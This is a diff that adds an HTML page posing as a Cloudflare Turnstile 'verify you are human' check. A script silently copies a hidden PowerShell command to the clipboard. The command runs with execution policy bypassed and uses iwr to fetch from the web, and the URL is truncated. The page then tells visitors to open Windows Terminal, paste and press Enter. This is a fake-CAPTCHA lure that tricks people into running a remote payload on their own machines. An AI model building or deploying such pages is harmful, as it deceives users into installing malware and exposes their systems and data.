@@ -1,0 +1,17 @@
+<html>
+<head><title>Security check</title></head>
+<body>
+<div class="cf-turnstile">
+<h2>Verify you are human</h2>
+<p>Cloudflare Turnstile verification required</p>
+<textarea id="cmd" style="display: none">powershell -ep bypass -c iwr ...</textarea>
+<script>
+navigator.clipboard.writeText(document.getElementById('cmd').value);
+</script>
+<p>1. Press Windows + X, then I to open Windows Terminal</p>
+<p>2. Press Ctrl + V to paste</p>
+<p>3. Press Enter to verify</p>
+<p>Opening PowerShell is required for verification.</p>
+</div>
+</body>
+</html>
